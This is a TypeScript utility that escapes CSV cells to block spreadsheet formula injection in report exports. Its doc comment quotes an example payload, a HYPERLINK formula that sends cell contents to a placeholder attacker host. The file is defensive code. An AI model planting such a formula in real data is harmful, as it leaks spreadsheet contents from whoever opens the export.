/**
 * CSV cell escaping shared by the server export routes and the browser export
 * helper.
 *
 * Beyond quoting, a leading `=`, `+`, `-`, `@`, tab or carriage return makes a
 * spreadsheet evaluate the cell as a formula. Guard-controlled fields such as a
 * full name are interpolated into reports, so a value like
 * `=HYPERLINK("http://attacker/?"&A1)` would execute in the admin's Excel.
 * Prefixing with a single quote forces the cell to text (OWASP CSV injection).
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function escapeCsvValue(value: unknown): string {
  let text = String(value ?? "");
  if (FORMULA_TRIGGER.test(text)) {
    text = `'${text}`;
  }
  return `"${text.replaceAll('"', '""')}"`;
}
